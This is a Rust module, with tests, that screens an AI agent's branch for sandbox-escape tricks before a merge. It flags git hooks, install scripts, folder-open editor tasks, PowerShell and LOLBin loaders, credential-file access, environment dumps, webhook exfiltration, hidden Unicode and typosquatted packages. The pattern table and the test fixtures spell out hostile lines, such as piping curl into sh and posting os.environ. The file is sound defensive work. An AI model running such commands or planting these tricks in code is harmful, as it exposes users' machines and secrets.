//! Merge check, stage 1 (ROADMAP Phase 2c): fixed rules over what a merge
//! of the agent's branch would bring in.
//!
//! The realistic way out of the sandbox is code the user takes over and
//! then runs on Windows, often without meaning to: install scripts, git
//! hooks, editor tasks. The rules therefore look first at files that run by
//! themselves, then at typical tricks in added lines. They cannot be talked
//! out of anything; a later AI stage may add findings, never remove these.
//! No rule finds everything: this is a safety net, not a verdict.

use std::collections::BTreeSet;

use crate::sync::{Incoming, IncomingFile, sanitize};

/// How much a finding matters.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Runs code on the host by itself or hides what code does.
    High,
    /// Worth a look before running anything.
    Medium,
    /// Unusual, mostly harmless.
    Low,
}

/// One thing the user should look at.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// How much it matters.
    pub severity: Severity,
    /// Stable id of the rule, e.g. `install-script`.
    pub rule: &'static str,
    /// File in the repository.
    pub path: String,
    /// Line in the new file, if the finding is about a line.
    pub line: Option<u32>,
    /// What and why (German).
    pub message: String,
    /// The line in question, made safe for the terminal and shortened.
    pub excerpt: Option<String>,
}

/// Lines longer than this are suspicious outside data files.
const LONG_LINE: usize = 1000;

/// Base64 or hex runs of this length hide payloads.
const LONG_BLOB: usize = 200;

/// Checks everything `incoming` would bring in. Findings are sorted, most
/// severe first.
pub fn review(incoming: &Incoming) -> Vec<Finding> {
    let mut findings = Vec::new();
    for file in &incoming.files {
        if file.status == 'D' {
            continue;
        }
        check_path(file, &mut findings);
        check_mode(file, &mut findings);
        if !file.binary {
            check_lines(file, &mut findings);
            check_dependencies(file, &mut findings);
        }
    }
    if incoming.truncated {
        findings.push(Finding {
            severity: Severity::Medium,
            rule: "too-large",
            path: String::new(),
            line: None,
            message: "Die Änderungen sind zu umfangreich; nur der Anfang wurde geprüft".to_owned(),
            excerpt: None,
        });
    }
    findings.sort_by(|a, b| (a.severity, &a.path, a.line).cmp(&(b.severity, &b.path, b.line)));
    findings
}

fn finding(
    file: &IncomingFile,
    severity: Severity,
    rule: &'static str,
    line: Option<(u32, &str)>,
    message: impl Into<String>,
) -> Finding {
    Finding {
        severity,
        rule,
        path: file.path.clone(),
        line: line.map(|(n, _)| n),
        message: message.into(),
        excerpt: line.map(|(_, text)| excerpt(text)),
    }
}

/// Shows invisible characters, removes terminal escapes and shortens.
pub fn excerpt(text: &str) -> String {
    let visible: String = text
        .trim()
        .chars()
        .map(|c| match c {
            c if is_bidi(c) || is_zero_width(c) => format!("<U+{:04X}>", c as u32),
            c => c.to_string(),
        })
        .collect();
    let clean = sanitize(&visible);
    if clean.chars().count() > 160 {
        let cut: String = clean.chars().take(157).collect();
        format!("{cut}…")
    } else {
        clean
    }
}

fn file_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn extension(path: &str) -> String {
    file_name(path)
        .rsplit_once('.')
        .map(|(_, ext)| ext.to_ascii_lowercase())
        .unwrap_or_default()
}

/// Files that run code on the host without being started explicitly, or
/// that change where code comes from.
fn check_path(file: &IncomingFile, findings: &mut Vec<Finding>) {
    let path = file.path.as_str();
    let lower = path.to_ascii_lowercase();
    let name = file_name(&lower);
    let new = if file.status == 'A' {
        "neu"
    } else {
        "geändert"
    };
    let rule = |severity, rule, message: String| finding(file, severity, rule, None, message);
    let hook_dirs = [".husky/", ".githooks/", ".git-hooks/", ".hooks/"];
    if hook_dirs.iter().any(|dir| lower.starts_with(dir))
        || matches!(
            name,
            "lefthook.yml" | "lefthook.yaml" | ".lefthook.yml" | ".pre-commit-config.yaml"
        )
    {
        findings.push(rule(
            Severity::High,
            "git-hook",
            format!("Git-Hook {new}: läuft bei git-Befehlen auf deinem Rechner"),
        ));
    }
    if name == ".envrc" {
        findings.push(rule(
            Severity::High,
            "envrc",
            format!(".envrc {new}: direnv führt sie beim Betreten des Ordners aus"),
        ));
    }
    if name == ".pnpmfile.cjs" || name == ".pnpmfile.js" {
        findings.push(rule(
            Severity::High,
            "pnpmfile",
            format!("{name} {new}: läuft bei jedem pnpm install"),
        ));
    }
    if lower == ".cargo/config.toml" || lower == ".cargo/config" {
        findings.push(rule(
            Severity::High,
            "cargo-config",
            format!(
                "Cargo-Konfiguration {new}: kann Wrapper und Runner festlegen, die bei \
                 cargo build/run starten"
            ),
        ));
    }
    if matches!(
        name,
        ".npmrc" | ".yarnrc" | ".yarnrc.yml" | "pip.conf" | ".pypirc"
    ) {
        findings.push(rule(
            Severity::High,
            "registry-config",
            format!("{name} {new}: kann Paketquellen und Skripte umstellen"),
        ));
    }
    if lower.starts_with(".vscode/") {
        let folder_open = file
            .added
            .iter()
            .any(|(_, l)| l.contains("folderOpen") || l.contains("runOn"));
        let (severity, message) = if name == "tasks.json" && folder_open {
            (
                Severity::High,
                "VS-Code-Task startet beim Öffnen des Ordners (runOn: folderOpen)".to_owned(),
            )
        } else {
            (
                Severity::Medium,
                format!(
                    "VS-Code-Einstellung {new}: Tasks und Einstellungen können Programme starten"
                ),
            )
        };
        findings.push(rule(severity, "editor-config", message));
    }
    if lower.starts_with(".devcontainer/") || lower.starts_with(".idea/") {
        findings.push(rule(
            Severity::Medium,
            "editor-config",
            format!("IDE-/Devcontainer-Konfiguration {new}"),
        ));
    }
    if lower.starts_with(".github/workflows/")
        || lower.starts_with(".circleci/")
        || matches!(
            name,
            ".gitlab-ci.yml" | "azure-pipelines.yml" | "jenkinsfile"
        )
    {
        findings.push(rule(
            Severity::Medium,
            "ci",
            format!("CI-Konfiguration {new}: läuft nach einem Push mit den Secrets des CI"),
        ));
    }
    if matches!(name, "setup.py" | "build.rs" | "conftest.py") {
        findings.push(rule(
            Severity::Medium,
            "build-script",
            format!("{name} {new}: läuft beim Bauen, Installieren oder Testen"),
        ));
    }
    if name == ".gitmodules" {
        findings.push(rule(
            Severity::Medium,
            "submodule",
            "Submodule geändert: holt Code aus anderen Repositories".to_owned(),
        ));
    }
    if name == ".gitattributes"
        && file
            .added
            .iter()
            .any(|(_, l)| l.contains("filter=") || l.contains("diff=") || l.contains("merge="))
    {
        findings.push(rule(
            Severity::Medium,
            "gitattributes",
            ".gitattributes setzt Filter-, Diff- oder Merge-Treiber".to_owned(),
        ));
    }
    let ext = extension(&lower);
    if matches!(
        ext.as_str(),
        "ps1" | "bat" | "cmd" | "vbs" | "psm1" | "reg" | "lnk"
    ) {
        findings.push(rule(
            Severity::Medium,
            "windows-script",
            format!("Windows-Skript {new} (.{ext})"),
        ));
    }
    if file.binary {
        let executable = matches!(
            ext.as_str(),
            "exe" | "dll" | "msi" | "scr" | "com" | "sys" | "so" | "dylib" | "node" | "jar"
        );
        findings.push(rule(
            if executable {
                Severity::High
            } else {
                Severity::Low
            },
            "binary",
            if executable {
                format!("Ausführbare Binärdatei {new} (.{ext}); der Inhalt lässt sich nicht prüfen")
            } else {
                format!("Binärdatei {new}; der Inhalt lässt sich nicht prüfen")
            },
        ));
    }
    if name == "package.json" {
        check_package_scripts(file, findings);
    }
}

/// npm runs these without being asked, on install or publish.
const LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepack",
    "postpack",
];

fn check_package_scripts(file: &IncomingFile, findings: &mut Vec<Finding>) {
    for (line, text) in &file.added {
        let key = text.trim().trim_start_matches('"');
        if let Some(script) = LIFECYCLE_SCRIPTS
            .iter()
            .find(|s| key.starts_with(&format!("{s}\"")))
        {
            findings.push(finding(
                file,
                Severity::High,
                "install-script",
                Some((*line, text)),
                format!("Installations-Skript „{script}“: läuft bei npm/pnpm install automatisch"),
            ));
        }
    }
}

fn check_mode(file: &IncomingFile, findings: &mut Vec<Finding>) {
    match file.new_mode.as_str() {
        "120000" => {
            let target = file.added.first().map(|(_, t)| t.as_str()).unwrap_or("");
            let escapes = target.starts_with('/')
                || target.starts_with('\\')
                || target.chars().nth(1) == Some(':')
                || target.split(['/', '\\']).filter(|p| *p == "..").count()
                    > file.path.matches('/').count();
            findings.push(finding(
                file,
                if escapes {
                    Severity::High
                } else {
                    Severity::Low
                },
                "symlink",
                file.added.first().map(|(n, t)| (*n, t.as_str())),
                if escapes {
                    "Symlink zeigt aus dem Repository hinaus".to_owned()
                } else {
                    "Symlink".to_owned()
                },
            ));
        }
        "160000" => findings.push(finding(
            file,
            Severity::Medium,
            "submodule",
            None,
            "Submodule-Eintrag: verweist auf Code in einem anderen Repository",
        )),
        "100755" if file.old_mode != "100755" => findings.push(finding(
            file,
            Severity::Low,
            "executable",
            None,
            "Datei wird ausführbar",
        )),
        _ => {}
    }
}

fn is_bidi(c: char) -> bool {
    matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}')
}

fn is_zero_width(c: char) -> bool {
    matches!(c, '\u{200B}'..='\u{200D}' | '\u{2060}' | '\u{FEFF}')
}

/// Patterns that fetch and run code or hide what runs. Lower case; each
/// entry is (needles that must all appear, severity, rule, message).
const PATTERNS: &[(&[&str], Severity, &str, &str)] = &[
    (
        &["curl ", "| sh"],
        Severity::High,
        "download-exec",
        "lädt ein Skript und führt es aus",
    ),
    (
        &["curl ", "|sh"],
        Severity::High,
        "download-exec",
        "lädt ein Skript und führt es aus",
    ),
    (
        &["curl ", "| bash"],
        Severity::High,
        "download-exec",
        "lädt ein Skript und führt es aus",
    ),
    (
        &["wget ", "| sh"],
        Severity::High,
        "download-exec",
        "lädt ein Skript und führt es aus",
    ),
    (
        &["wget ", "| bash"],
        Severity::High,
        "download-exec",
        "lädt ein Skript und führt es aus",
    ),
    (
        &["invoke-expression"],
        Severity::High,
        "powershell-exec",
        "PowerShell führt Text als Code aus (Invoke-Expression)",
    ),
    (
        &["iex "],
        Severity::High,
        "powershell-exec",
        "PowerShell führt Text als Code aus (iex)",
    ),
    (
        &["iex("],
        Severity::High,
        "powershell-exec",
        "PowerShell führt Text als Code aus (iex)",
    ),
    (
        &["-encodedcommand"],
        Severity::High,
        "powershell-exec",
        "PowerShell mit verschlüsseltem Befehl",
    ),
    (
        &["powershell", " -enc "],
        Severity::High,
        "powershell-exec",
        "PowerShell mit verschlüsseltem Befehl",
    ),
    (
        &["frombase64string"],
        Severity::Medium,
        "decode",
        "dekodiert Base64 zur Laufzeit",
    ),
    (
        &["certutil", "-decode"],
        Severity::High,
        "lolbin",
        "certutil dekodiert eine Datei (bekannter Trick)",
    ),
    (
        &["mshta"],
        Severity::High,
        "lolbin",
        "mshta startet HTML-Anwendungen (bekannter Trick)",
    ),
    (
        &["rundll32"],
        Severity::Medium,
        "lolbin",
        "rundll32 startet Code aus DLLs",
    ),
    (
        &["regsvr32"],
        Severity::Medium,
        "lolbin",
        "regsvr32 kann Code nachladen",
    ),
    (
        &["bitsadmin", "/transfer"],
        Severity::High,
        "lolbin",
        "bitsadmin lädt Dateien herunter",
    ),
    (
        &["eval(", "atob("],
        Severity::High,
        "decode-exec",
        "führt dekodierten Text als Code aus",
    ),
    (
        &["eval(", "base64"],
        Severity::High,
        "decode-exec",
        "führt dekodierten Text als Code aus",
    ),
    (
        &["eval(", "fromcharcode"],
        Severity::High,
        "decode-exec",
        "führt zusammengesetzten Text als Code aus",
    ),
    (
        &["exec(", "base64"],
        Severity::High,
        "decode-exec",
        "führt dekodierten Text als Code aus",
    ),
    (
        &["exec(", "b64decode"],
        Severity::High,
        "decode-exec",
        "führt dekodierten Text als Code aus",
    ),
    (
        &["new function("],
        Severity::Medium,
        "dynamic-code",
        "erzeugt Code zur Laufzeit (new Function)",
    ),
    (
        &["base64 -d", "| sh"],
        Severity::High,
        "decode-exec",
        "dekodiert und führt aus",
    ),
    (
        &["base64 --decode", "| sh"],
        Severity::High,
        "decode-exec",
        "dekodiert und führt aus",
    ),
    (
        &["/.ssh/"],
        Severity::Medium,
        "credentials",
        "greift auf SSH-Schlüssel zu",
    ),
    (
        &["id_rsa"],
        Severity::Medium,
        "credentials",
        "greift auf SSH-Schlüssel zu",
    ),
    (
        &[".aws/credentials"],
        Severity::Medium,
        "credentials",
        "greift auf AWS-Zugangsdaten zu",
    ),
    (
        &["login data"],
        Severity::High,
        "credentials",
        "greift auf gespeicherte Browser-Passwörter zu",
    ),
    (
        &["local state", "appdata"],
        Severity::High,
        "credentials",
        "greift auf Browser-Schlüssel zu",
    ),
    (
        &["\\cookies"],
        Severity::Medium,
        "credentials",
        "greift auf Browser-Cookies zu",
    ),
    (
        &["json.stringify(process.env"],
        Severity::High,
        "env-dump",
        "sammelt alle Umgebungsvariablen (oft mit Zugangsdaten)",
    ),
    (
        &["dict(os.environ"],
        Severity::High,
        "env-dump",
        "sammelt alle Umgebungsvariablen (oft mit Zugangsdaten)",
    ),
    (
        &["os.environ.copy()"],
        Severity::Medium,
        "env-dump",
        "kopiert alle Umgebungsvariablen",
    ),
    (
        &["get-childitem env:"],
        Severity::Medium,
        "env-dump",
        "liest alle Umgebungsvariablen",
    ),
    (
        &["discord.com/api/webhooks"],
        Severity::High,
        "exfiltration",
        "schickt Daten an einen Discord-Webhook",
    ),
    (
        &["api.telegram.org/bot"],
        Severity::High,
        "exfiltration",
        "schickt Daten an einen Telegram-Bot",
    ),
    (
        &["pastebin.com"],
        Severity::Medium,
        "exfiltration",
        "spricht mit pastebin.com",
    ),
    (
        &["ngrok.io"],
        Severity::Medium,
        "exfiltration",
        "spricht mit einem ngrok-Tunnel",
    ),
];

/// Data files where long lines and blobs are normal.
fn is_data_file(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    let name = file_name(&lower);
    name.ends_with(".lock")
        || name.ends_with("-lock.json")
        || name.ends_with("-lock.yaml")
        || name == "package-lock.json"
        || name.ends_with(".min.js")
        || name.ends_with(".min.css")
        || name.ends_with(".map")
        || name.ends_with(".svg")
        || name.ends_with(".snap")
        || matches!(extension(&lower).as_str(), "csv" | "tsv" | "ipynb")
}

fn longest_run(text: &str, allowed: impl Fn(char) -> bool) -> usize {
    let mut best = 0;
    let mut current = 0;
    for c in text.chars() {
        if allowed(c) {
            current += 1;
            best = best.max(current);
        } else {
            current = 0;
        }
    }
    best
}

fn check_lines(file: &IncomingFile, findings: &mut Vec<Finding>) {
    let data = is_data_file(&file.path);
    let mut seen: BTreeSet<&str> = BTreeSet::new();
    for (line, text) in &file.added {
        let at = Some((*line, text.as_str()));
        if text.chars().any(is_bidi) {
            findings.push(finding(
                file,
                Severity::High,
                "bidi",
                at,
                "Unsichtbare Richtungszeichen: Der Code läuft anders, als er aussieht (Trojan Source)",
            ));
        } else if text.chars().skip(1).any(is_zero_width)
            || (*line > 1 && text.starts_with('\u{FEFF}'))
        {
            findings.push(finding(
                file,
                Severity::Medium,
                "zero-width",
                at,
                "Unsichtbare Zeichen im Text",
            ));
        }
        if has_homoglyph_word(text) {
            findings.push(finding(
                file,
                Severity::Medium,
                "homoglyph",
                at,
                "Wort mischt lateinische mit kyrillischen oder griechischen Buchstaben",
            ));
        }
        let lower = text.to_lowercase();
        for (needles, severity, rule, message) in PATTERNS {
            // One finding per rule and file line is enough.
            if needles.iter().all(|n| lower.contains(n)) && seen.insert(rule) {
                findings.push(finding(file, *severity, rule, at, *message));
            }
        }
        if !data {
            let base64 = longest_run(text, |c| {
                c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=')
            });
            let hex = longest_run(text, |c| c.is_ascii_hexdigit() || c == '\\' || c == 'x');
            if base64 >= LONG_BLOB || hex >= LONG_BLOB {
                findings.push(finding(
                    file,
                    Severity::Medium,
                    "blob",
                    at,
                    format!(
                        "Langer kodierter Block ({} Zeichen): kann versteckten Code enthalten",
                        base64.max(hex)
                    ),
                ));
            } else if text.chars().count() > LONG_LINE {
                findings.push(finding(
                    file,
                    Severity::Low,
                    "long-line",
                    at,
                    format!("Sehr lange Zeile ({} Zeichen)", text.chars().count()),
                ));
            }
        }
        seen.clear();
    }
}

/// A word with Latin letters and Cyrillic or Greek look-alikes, as in
/// `pаypal` with a Cyrillic а.
fn has_homoglyph_word(text: &str) -> bool {
    text.split(|c: char| !c.is_alphanumeric()).any(|word| {
        let latin = word.chars().any(|c| c.is_ascii_alphabetic());
        let lookalike = word
            .chars()
            .any(|c| matches!(c, '\u{0370}'..='\u{03FF}' | '\u{0400}'..='\u{04FF}'));
        latin && lookalike
    })
}

/// Widely used packages; a new dependency one typo away from one of them is
/// a classic trap (typosquatting).
const POPULAR: &[&str] = &[
    // npm
    "react",
    "react-dom",
    "lodash",
    "express",
    "axios",
    "chalk",
    "commander",
    "debug",
    "moment",
    "dayjs",
    "typescript",
    "webpack",
    "vite",
    "eslint",
    "prettier",
    "jest",
    "vitest",
    "mocha",
    "next",
    "vue",
    "svelte",
    "angular",
    "rxjs",
    "uuid",
    "dotenv",
    "yargs",
    "inquirer",
    "request",
    "node-fetch",
    "cross-env",
    "nodemon",
    "socket.io",
    "mongoose",
    "redis",
    "pg",
    "mysql",
    "sequelize",
    "prisma",
    "zod",
    "jsonwebtoken",
    "bcrypt",
    "cors",
    "body-parser",
    "colors",
    "async",
    "underscore",
    "jquery",
    "bootstrap",
    "tailwindcss",
    "babel-core",
    "electron",
    "puppeteer",
    "playwright",
    "sharp",
    "ws",
    "glob",
    "minimist",
    "semver",
    "event-stream",
    "ua-parser-js",
    "coa",
    "rc",
    // Legitimate packages close to others above, so they are no finding.
    "preact",
    "just",
    "vuex",
    "redux",
    "nuxt",
    "chai",
    "pino",
    "execa",
    "knex",
    "hapi",
    "nest",
    // Python
    "requests",
    "numpy",
    "pandas",
    "flask",
    "django",
    "fastapi",
    "pydantic",
    "scipy",
    "matplotlib",
    "pillow",
    "boto3",
    "urllib3",
    "setuptools",
    "pytest",
    "beautifulsoup4",
    "selenium",
    "cryptography",
    "pyyaml",
    "tensorflow",
    "torch",
    "scikit-learn",
    "httpx",
    "aiohttp",
    "jinja2",
    "click",
    "colorama",
    "openai",
    "anthropic",
    // Rust
    "serde",
    "serde_json",
    "tokio",
    "rand",
    "clap",
    "anyhow",
    "thiserror",
    "reqwest",
    "regex",
    "chrono",
    "log",
    "tracing",
    "hyper",
    "futures",
    "once_cell",
    "lazy_static",
    "itertools",
];

/// Levenshtein distance, or 1 for a swap of neighbours.
fn distance(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    if a.len() == b.len() {
        let diff: Vec<usize> = (0..a.len()).filter(|&i| a[i] != b[i]).collect();
        if diff.len() == 2
            && diff[1] == diff[0] + 1
            && a[diff[0]] == b[diff[1]]
            && a[diff[1]] == b[diff[0]]
        {
            return 1;
        }
    }
    let mut previous: Vec<usize> = (0..=b.len()).collect();
    for (i, ca) in a.iter().enumerate() {
        let mut current = vec![i + 1];
        for (j, cb) in b.iter().enumerate() {
            let cost = usize::from(ca != cb);
            current.push(
                (previous[j] + cost)
                    .min(previous[j + 1] + 1)
                    .min(current[j] + 1),
            );
        }
        previous = current;
    }
    previous[b.len()]
}

/// The popular package a name imitates, if any.
pub fn imitates(name: &str) -> Option<&'static str> {
    let name = name.to_ascii_lowercase();
    if name.len() < 4 || POPULAR.contains(&name.as_str()) {
        return None;
    }
    POPULAR.iter().copied().filter(|p| p.len() >= 4).find(|p| {
        distance(&name, p) == 1 || name.replace(['-', '_'], "") == p.replace(['-', '_'], "")
    })
}

/// Dependency names declared in added lines, by file type.
fn declared_dependencies(file: &IncomingFile) -> Vec<(u32, String, &str)> {
    let name = file_name(&file.path).to_ascii_lowercase();
    let mut found = Vec::new();
    for (line, text) in &file.added {
        let trimmed = text.trim();
        let dependency = match name.as_str() {
            "package.json" => trimmed
                .strip_prefix('"')
                .and_then(|rest| rest.split_once("\":"))
                .filter(|(_, value)| {
                    let v = value.trim().trim_start_matches('"');
                    v.starts_with(|c: char| {
                        c.is_ascii_digit() || matches!(c, '^' | '~' | '*' | '>' | '<' | '=')
                    }) || v.starts_with("npm:")
                        || v.starts_with("git")
                        || v.starts_with("http")
                })
                .map(|(dep, _)| dep.to_owned()),
            "cargo.toml" => trimmed
                .split_once('=')
                .filter(|(key, value)| {
                    let v = value.trim();
                    !key.contains('.')
                        && (v.starts_with('"') || v.starts_with('{'))
                        && !matches!(
                            key.trim(),
                            "name"
                                | "version"
                                | "edition"
                                | "description"
                                | "license"
                                | "authors"
                                | "readme"
                                | "repository"
                                | "homepage"
                                | "rust-version"
                                | "resolver"
                                | "path"
                                | "publish"
                        )
                })
                .map(|(key, _)| key.trim().to_owned()),
            n if n.starts_with("requirements") && n.ends_with(".txt") => {
                let end = trimmed
                    .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')))
                    .unwrap_or(trimmed.len());
                (!trimmed.starts_with('#') && !trimmed.starts_with('-') && end > 0)
                    .then(|| trimmed[..end].to_owned())
            }
            _ => None,
        };
        if let Some(dependency) = dependency {
            found.push((*line, dependency, text.as_str()));
        }
    }
    found
}

fn check_dependencies(file: &IncomingFile, findings: &mut Vec<Finding>) {
    for (line, name, text) in declared_dependencies(file) {
        if let Some(original) = imitates(&name) {
            // Short names are often one letter from another legitimate one.
            let severity = if original.len() >= 6 {
                Severity::High
            } else {
                Severity::Medium
            };
            findings.push(finding(
                file,
                severity,
                "typosquat",
                Some((line, text)),
                format!("Paket „{name}“ ähnelt „{original}“: eine bekannte Falle mit Schadpaketen"),
            ));
        }
    }
    let name = file_name(&file.path).to_ascii_lowercase();
    for (line, text) in &file.added {
        let lower = text.to_lowercase();
        let foreign_source = match name.as_str() {
            "package-lock.json" => {
                lower.contains("\"resolved\"") && !lower.contains("https://registry.npmjs.org/")
            }
            "yarn.lock" => {
                lower.trim_start().starts_with("resolved ")
                    && !lower.contains("registry.yarnpkg.com")
                    && !lower.contains("registry.npmjs.org")
            }
            "pnpm-lock.yaml" => lower.contains("tarball:"),
            "cargo.lock" => {
                lower.starts_with("source = ")
                    && !lower.contains("registry+https://github.com/rust-lang/crates.io-index")
            }
            n if n.starts_with("requirements") && n.ends_with(".txt") => {
                lower.contains("--index-url")
                    || lower.contains("--extra-index-url")
                    || lower.contains("git+")
            }
            _ => false,
        };
        if foreign_source {
            findings.push(finding(
                file,
                Severity::High,
                "foreign-source",
                Some((*line, text)),
                "Paket kommt nicht aus der üblichen Registry",
            ));
        }
        if name == "package.json"
            && (lower.contains("\"git+")
                || lower.contains("\"http://")
                || lower.contains("\"https://"))
            && !lower.contains("\"homepage\"")
            && !lower.contains("\"url\"")
        {
            findings.push(finding(
                file,
                Severity::Medium,
                "foreign-source",
                Some((*line, text)),
                "Abhängigkeit direkt von einer URL oder einem Git-Repository",
            ));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn file(path: &str, status: char, lines: &[&str]) -> IncomingFile {
        IncomingFile {
            path: path.into(),
            status,
            old_mode: if status == 'A' { "000000" } else { "100644" }.into(),
            new_mode: "100644".into(),
            binary: false,
            added: lines
                .iter()
                .enumerate()
                .map(|(i, l)| (i as u32 + 1, (*l).to_owned()))
                .collect(),
        }
    }

    fn rules(files: Vec<IncomingFile>) -> Vec<(&'static str, Severity)> {
        review(&Incoming {
            files,
            truncated: false,
        })
        .into_iter()
        .map(|f| (f.rule, f.severity))
        .collect()
    }

    #[test]
    fn files_that_run_by_themselves() {
        let found = rules(vec![
            file(".husky/pre-commit", 'A', &["npm test"]),
            file(".envrc", 'A', &["export X=1"]),
            file(
                ".vscode/tasks.json",
                'M',
                &[r#""runOptions": { "runOn": "folderOpen" }"#],
            ),
            file(
                ".cargo/config.toml",
                'A',
                &["[build]", "rustc-wrapper = \"./w\""],
            ),
            file(".github/workflows/ci.yml", 'M', &["run: make"]),
            file(
                "package.json",
                'M',
                &[
                    r#"    "postinstall": "node setup.js","#,
                    r#"    "test": "vitest""#,
                ],
            ),
        ]);
        for expected in [
            ("git-hook", Severity::High),
            ("envrc", Severity::High),
            ("editor-config", Severity::High),
            ("cargo-config", Severity::High),
            ("ci", Severity::Medium),
            ("install-script", Severity::High),
        ] {
            assert!(
                found.contains(&expected),
                "{expected:?} missing in {found:?}"
            );
        }
        // The plain test script is no finding.
        assert_eq!(
            found.iter().filter(|(r, _)| *r == "install-script").count(),
            1
        );
    }

    #[test]
    fn tricks_in_added_lines() {
        let payload = "QUJD".repeat(60);
        let found = rules(vec![
            file(
                "install.sh",
                'A',
                &["curl -fsSL https://x.example/i.sh | sh"],
            ),
            file(
                "run.ps1",
                'A',
                &["powershell -enc SQBFAFgA", "IEX (New-Object Net.WebClient)"],
            ),
            file("a.js", 'A', &[&format!("eval(atob('{payload}'))")]),
            file("b.js", 'A', &["const ok = true; /* \u{202E} } \u{2066} */"]),
            file("c.py", 'A', &["requests.post(url, json=dict(os.environ))"]),
            file(
                "d.js",
                'A',
                &["fetch('https://discord.com/api/webhooks/1/x')"],
            ),
            file("e.js", 'A', &["const pаypal = 1;"]),
        ]);
        for expected in [
            ("download-exec", Severity::High),
            ("windows-script", Severity::Medium),
            ("powershell-exec", Severity::High),
            ("decode-exec", Severity::High),
            ("blob", Severity::Medium),
            ("bidi", Severity::High),
            ("env-dump", Severity::High),
            ("exfiltration", Severity::High),
            ("homoglyph", Severity::Medium),
        ] {
            assert!(
                found.contains(&expected),
                "{expected:?} missing in {found:?}"
            );
        }
    }

    #[test]
    fn ordinary_changes_stay_quiet() {
        let found = rules(vec![
            file(
                "src/main.rs",
                'M',
                &["fn main() {", "    println!(\"Grüße, Welt\");", "}"],
            ),
            file("README.md", 'M', &["# Projekt", "Läuft mit `npm start`."]),
            file(
                "package-lock.json",
                'M',
                &[r#""resolved": "https://registry.npmjs.org/react/-/react-19.0.0.tgz","#],
            ),
            file("old.txt", 'D', &[]),
        ]);
        assert!(found.is_empty(), "{found:?}");
    }

    #[test]
    fn dependencies_and_sources() {
        assert_eq!(imitates("reqeusts"), Some("requests"));
        assert_eq!(imitates("lodahs"), Some("lodash"));
        assert_eq!(imitates("crossenv"), Some("cross-env"));
        assert_eq!(imitates("react"), None);
        assert_eq!(imitates("preact"), None);
        assert_eq!(imitates("left-pad"), None);
        assert_eq!(imitates("just"), None);
        let found = rules(vec![
            file(
                "package.json",
                'M',
                &[
                    r#"    "reqeusts": "^2.0.0","#,
                    r#"    "x": "git+https://evil/x.git""#,
                ],
            ),
            file(
                "requirements.txt",
                'M',
                &["numpyy==1.0", "--extra-index-url https://pypi.evil"],
            ),
            file(
                "package-lock.json",
                'M',
                &[r#""resolved": "https://evil.example/react-19.0.0.tgz","#],
            ),
        ]);
        for expected in [
            ("typosquat", Severity::High),
            ("foreign-source", Severity::High),
            ("foreign-source", Severity::Medium),
        ] {
            assert!(
                found.contains(&expected),
                "{expected:?} missing in {found:?}"
            );
        }
    }

    #[test]
    fn modes_binaries_and_order() {
        let mut link = file("docs/link", 'A', &["../../../Windows/System32"]);
        link.new_mode = "120000".into();
        let mut exe = file("tools/helper.exe", 'A', &[]);
        exe.binary = true;
        let mut script = file("scripts/x.sh", 'A', &["echo hi"]);
        script.new_mode = "100755".into();
        let findings = review(&Incoming {
            files: vec![script, link, exe],
            truncated: true,
        });
        let found: Vec<_> = findings.iter().map(|f| (f.rule, f.severity)).collect();
        assert!(found.contains(&("symlink", Severity::High)));
        assert!(found.contains(&("binary", Severity::High)));
        assert!(found.contains(&("executable", Severity::Low)));
        assert!(found.contains(&("too-large", Severity::Medium)));
        // Most severe first.
        assert!(findings.windows(2).all(|w| w[0].severity <= w[1].severity));
        // Excerpts show what the eye would miss.
        assert_eq!(excerpt("a\u{202E}b\x1b[31m"), "a<U+202E>b�[31m");
    }
}
